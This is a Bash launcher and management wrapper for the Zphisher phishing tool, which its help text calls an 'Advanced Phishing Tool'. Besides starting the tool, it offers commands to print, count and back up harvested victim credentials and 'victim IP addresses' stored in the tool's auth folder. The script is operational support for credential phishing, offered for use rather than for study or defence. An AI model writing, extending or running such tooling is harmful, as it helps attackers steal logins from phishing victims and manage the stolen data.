#!/usr/bin/env bash

# Enhanced Zphisher Launcher Script
# https://github.com/htr-tech/zphisher

# Global variables
readonly SCRIPT_NAME="zphisher"
readonly VERSION="2.0.0"
readonly CONFIG_DIR="$HOME/.config/zphisher"

# Detect platform and set root directory
detect_platform() {
    case "$(uname -o)" in
        *Android*) 
            ZPHISHER_ROOT="/data/data/com.termux/files/usr/opt/zphisher"
            ;;
        *)
            ZPHISHER_ROOT="/opt/zphisher"
            ;;
    esac
    readonly ZPHISHER_ROOT
}

# Initialize configuration
initialize_config() {
    if [[ ! -d "$CONFIG_DIR" ]]; then
        mkdir -p "$CONFIG_DIR" || {
            echo "Error: Failed to create config directory $CONFIG_DIR"
            exit 1
        }
    fi
}

# Color codes for output
setup_colors() {
    if [[ -t 2 ]] && [[ -z "${NO_COLOR-}" ]] && [[ "${TERM-}" != "dumb" ]]; then
        readonly RED='\033[0;31m' GREEN='\033[0;32m' YELLOW='\033[1;33m' BLUE='\033[0;34m' 
        readonly MAGENTA='\033[0;35m' CYAN='\033[0;36m' WHITE='\033[1;37m' NC='\033[0m'
    else
        readonly RED='' GREEN='' YELLOW='' BLUE='' MAGENTA='' CYAN='' WHITE='' NC=''
    fi
}

# Print colored output
print_color() {
    local color="$1"
    local msg="$2"
    echo -e "${color}${msg}${NC}"
}

# Print error message and exit
die() {
    print_color "$RED" "Error: $1" >&2
    exit 1
}

# Check if Zphisher is installed
check_installation() {
    if [[ ! -d "$ZPHISHER_ROOT" ]]; then
        die "Zphisher is not installed. Please install it first from https://github.com/htr-tech/zphisher"
    fi
    
    if [[ ! -f "$ZPHISHER_ROOT/zphisher.sh" ]]; then
        die "Zphisher main script not found at $ZPHISHER_ROOT/zphisher.sh"
    fi
}

# Check for dependencies
check_dependencies() {
    local dependencies=("bash" "php" "wget" "curl" "git")
    local missing=()
    
    for dep in "${dependencies[@]}"; do
        if ! command -v "$dep" &> /dev/null; then
            missing+=("$dep")
        fi
    done
    
    if [[ ${#missing[@]} -gt 0 ]]; then
        print_color "$YELLOW" "Warning: Missing dependencies: ${missing[*]}"
        print_color "$YELLOW" "Some features might not work properly"
    fi
}

# Display help information
show_help() {
    cat << EOF
${SCRIPT_NAME} v${VERSION} - Advanced Phishing Tool

Usage: ${SCRIPT_NAME} [OPTIONS]

Options:
  -h, --help          Show this help message and exit
  -v, --version       Show version information
  -c, --credentials   View saved credentials
  -i, --ip            View saved victim IP addresses
  -s, --stats         Show statistics about collected data
  -b, --backup        Backup collected data to $CONFIG_DIR/backup
  -u, --update        Update Zphisher to the latest version
  --uninstall         Remove Zphisher and all collected data

Without any options, launches the Zphisher tool.

EOF
}

# Display version information
show_version() {
    echo "${SCRIPT_NAME} v${VERSION}"
    echo "Official repository: https://github.com/htr-tech/zphisher"
}

# View saved credentials
view_credentials() {
    local cred_file="$ZPHISHER_ROOT/auth/usernames.dat"
    
    if [[ -f "$cred_file" ]]; then
        print_color "$GREEN" "Saved credentials:"
        echo "=================="
        # Count entries and display securely
        local count=$(wc -l < "$cred_file" 2>/dev/null)
        if [[ $count -gt 0 ]]; then
            print_color "$CYAN" "Found $count credential(s):"
            echo
            cat "$cred_file"
        else
            print_color "$YELLOW" "No credentials found in the file."
        fi
    else
        print_color "$YELLOW" "No credentials file found."
    fi
}

# View saved IP addresses
view_ips() {
    local ip_file="$ZPHISHER_ROOT/auth/ip.txt"
    
    if [[ -f "$ip_file" ]]; then
        print_color "$GREEN" "Saved IP addresses:"
        echo "==================="
        # Count entries and display securely
        local count=$(wc -l < "$ip_file" 2>/dev/null)
        if [[ $count -gt 0 ]]; then
            print_color "$CYAN" "Found $count IP address(es):"
            echo
            cat "$ip_file"
        else
            print_color "$YELLOW" "No IP addresses found in the file."
        fi
    else
        print_color "$YELLOW" "No IP addresses file found."
    fi
}

# Show statistics
show_stats() {
    local cred_file="$ZPHISHER_ROOT/auth/usernames.dat"
    local ip_file="$ZPHISHER_ROOT/auth/ip.txt"
    local cred_count=0
    local ip_count=0
    
    if [[ -f "$cred_file" ]]; then
        cred_count=$(wc -l < "$cred_file" 2>/dev/null)
    fi
    
    if [[ -f "$ip_file" ]]; then
        ip_count=$(wc -l < "$ip_file" 2>/dev/null)
    fi
    
    print_color "$MAGENTA" "Zphisher Statistics"
    echo "====================="
    print_color "$CYAN" "Credentials collected: $cred_count"
    print_color "$CYAN" "IP addresses collected: $ip_count"
    
    if [[ -f "$CONFIG_DIR/stats.log" ]]; then
        echo
        print_color "$GREEN" "Recent activity:"
        tail -5 "$CONFIG_DIR/stats.log"
    fi
}

# Backup collected data
backup_data() {
    local backup_dir="$CONFIG_DIR/backup/$(date +%Y%m%d_%H%M%S)"
    local auth_dir="$ZPHISHER_ROOT/auth"
    
    if [[ ! -d "$auth_dir" ]]; then
        print_color "$YELLOW" "No authentication data found to backup."
        return 1
    fi
    
    mkdir -p "$backup_dir" || die "Failed to create backup directory"
    
    if cp -r "$auth_dir"/* "$backup_dir"/ 2>/dev/null; then
        print_color "$GREEN" "Backup created successfully at: $backup_dir"
        echo "Backup created: $(date)" >> "$CONFIG_DIR/stats.log"
    else
        die "Failed to create backup"
    fi
}

# Update Zphisher
update_zphisher() {
    print_color "$BLUE" "Checking for updates..."
    
    cd "$ZPHISHER_ROOT" || die "Cannot access Zphisher directory"
    
    if ! git remote -v | grep -q "github.com.*htr-tech/zphisher"; then
        print_color "$YELLOW" "This doesn't appear to be a git repository. Manual update required."
        return 1
    fi
    
    # Fetch latest changes
    if git fetch origin; then
        local current_commit=$(git rev-parse HEAD)
        local remote_commit=$(git rev-parse origin/master)
        
        if [[ "$current_commit" == "$remote_commit" ]]; then
            print_color "$GREEN" "Zphisher is already up to date."
        else
            print_color "$BLUE" "New version available. Updating..."
            if git pull origin master; then
                print_color "$GREEN" "Update completed successfully."
                echo "Updated: $(date) from $current_commit to $remote_commit" >> "$CONFIG_DIR/stats.log"
            else
                die "Update failed. Please check your internet connection and try again."
            fi
        fi
    else
        die "Failed to check for updates. Check your internet connection."
    fi
}

# Uninstall Zphisher
uninstall_zphisher() {
    print_color "$RED" "WARNING: This will remove Zphisher and all collected data!"
    read -rp "Are you sure you want to continue? (y/N): " confirm
    
    if [[ "$confirm" != "y" && "$confirm" != "Y" ]]; then
        print_color "$BLUE" "Uninstall cancelled."
        exit 0
    fi
    
    # Remove Zphisher installation
    if sudo rm -rf "$ZPHISHER_ROOT" 2>/dev/null || rm -rf "$ZPHISHER_ROOT" 2>/dev/null; then
        print_color "$GREEN" "Zphisher removed successfully."
    else
        die "Failed to remove Zphisher. You may need to run with sudo."
    fi
    
    # Optionally remove config and backup data
    read -rp "Also remove all config and backup data? (y/N): " remove_config
    if [[ "$remove_config" == "y" || "$remove_config" == "Y" ]]; then
        if rm -rf "$CONFIG_DIR"; then
            print_color "$GREEN" "All data removed successfully."
        else
            print_color "$YELLOW" "Failed to remove config data. You can manually remove $CONFIG_DIR"
        fi
    fi
}

# Main function
main() {
    # Initialize
    detect_platform
    setup_colors
    initialize_config
    
    # Parse command line arguments
    case "${1:-}" in
        -h|--help)
            show_help
            exit 0
            ;;
        -v|--version)
            show_version
            exit 0
            ;;
        -c|--credentials)
            check_installation
            view_credentials
            exit 0
            ;;
        -i|--ip)
            check_installation
            view_ips
            exit 0
            ;;
        -s|--stats)
            check_installation
            show_stats
            exit 0
            ;;
        -b|--backup)
            check_installation
            backup_data
            exit 0
            ;;
        -u|--update)
            check_installation
            check_dependencies
            update_zphisher
            exit 0
            ;;
        --uninstall)
            uninstall_zphisher
            exit 0
            ;;
        "")
            check_installation
            check_dependencies
            print_color "$GREEN" "Starting Zphisher..."
            cd "$ZPHISHER_ROOT" || die "Cannot access Zphisher directory"
            bash ./zphisher.sh
            ;;
        *)
            print_color "$RED" "Unknown option: $1"
            show_help
            exit 1
            ;;
    esac
}

# Run main function
main "$@"